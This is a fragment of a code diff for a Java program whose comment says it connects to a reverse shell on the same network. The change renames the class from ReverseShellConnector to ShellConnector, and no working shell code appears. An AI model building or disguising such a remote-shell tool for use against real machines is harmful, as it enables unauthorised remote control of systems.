@@ -8,7 +8,7 @@ import java.net.UnknownHostException;
 
 //connects to reverse shell within same network
 
-public class ReverseShellConnector {
+public class ShellConnector {
 
     public static void main() {
         boolean ConnectingToHost = true;
